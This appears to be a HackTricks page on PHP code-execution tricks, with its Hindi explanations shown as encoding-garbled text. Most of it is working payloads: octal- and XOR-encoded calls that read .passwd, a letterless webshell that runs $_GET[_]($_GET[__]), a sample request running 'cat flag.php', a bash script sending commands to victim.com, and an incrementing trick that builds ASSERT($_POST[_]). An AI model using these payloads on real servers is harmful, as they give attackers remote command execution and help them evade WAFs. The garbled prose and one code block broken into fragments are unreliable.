рдпрджрд┐ рдЖрдк рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ `phpconfig()` рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ **Xdebug** **рд╕рдХреНрд╖рдо** рд╣реИ, рддреЛ рдЖрдкрдХреЛ [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

## рд╡реЗрд░рд┐рдПрдмрд▓ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE abusing new $\_GET\["a"]\($\_GET\["b")

рдпрджрд┐ рдХрд┐рд╕реА рдкреГрд╖реНрда рдореЗрдВ рдЖрдк **рдХрд┐рд╕реА рднреА рдордирдЪрд╛рд╣реА рдХрдХреНрд╖рд╛ рдХрд╛ рдПрдХ рдирдпрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рджреЗрдЦреЗрдВ:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Execute PHP without letters

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Using octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ┬в___ not needed then $_($__), show_source(.passwd)
```
### XOR рдЖрд╕рд╛рди рд╢реЗрд▓ рдХреЛрдб

According to [**this writeup** ](https://mgp25.com/ctf/Web-challenge/)рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдПрдХ рдЖрд╕рд╛рди рд╢реЗрд▓рдХреЛрдб рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
рддреЛ, рдЕрдЧрд░ рдЖрдк **рд╕рдВрдЦреНрдпрд╛рдУрдВ рдФрд░ рдЕрдХреНрд╖рд░реЛрдВ рдХреЗ рдмрд┐рдирд╛ рдордирдорд╛рдирд╛ PHP рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк рдЙрд╕ рдкреЗрд▓реЛрдб рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдордирдорд╛рдирд╛ PHP рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
For a more in depth explanation check [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (inside eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### рдкрд░реНрд▓ рдЬреИрд╕рд╛
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
